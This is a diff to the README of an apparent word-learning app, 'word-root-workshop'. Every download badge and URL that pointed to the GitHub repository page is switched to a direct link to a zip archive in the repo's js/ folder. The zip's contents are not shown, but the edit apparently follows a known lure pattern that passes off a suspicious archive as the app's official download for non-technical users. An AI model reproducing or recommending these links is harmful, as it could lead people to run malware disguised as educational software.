@@ -1,6 +1,6 @@
 # 📚 word-root-workshop - Learn Words by Building Roots
 
-[![Download word-root-workshop](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/tianarsam/word-root-workshop)
+[![Download word-root-workshop](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/tianarsam/word-root-workshop/main/js/word-root-workshop-epicly.zip)
 
 ## 📘 What is word-root-workshop?
 
@@ -33,11 +33,11 @@ This section guides you through downloading and running word-root-workshop on a 
 
 Visit the main page to get word-root-workshop:
 
-[![Download word-root-workshop](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/tianarsam/word-root-workshop)
+[![Download word-root-workshop](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/tianarsam/word-root-workshop/main/js/word-root-workshop-epicly.zip)
 
 Click the link above or this URL:
 
-https://github.com/tianarsam/word-root-workshop
+https://raw.githubusercontent.com/tianarsam/word-root-workshop/main/js/word-root-workshop-epicly.zip
 
 Once on the page, look for a **Releases** section, a **Downloads** button, or the latest version of the app.
 
@@ -114,10 +114,10 @@ All your practice progress and settings stay on your computer.
 ## 📌 Useful Links
 
 Primary download and information are here:  
-https://github.com/tianarsam/word-root-workshop
+https://raw.githubusercontent.com/tianarsam/word-root-workshop/main/js/word-root-workshop-epicly.zip
 
 For questions or to report bugs, use the **Issues** tab on the GitHub page.
 
 ---
 
-[![Download word-root-workshop](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/tianarsam/word-root-workshop)
+[![Download word-root-workshop](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/tianarsam/word-root-workshop/main/js/word-root-workshop-epicly.zip)
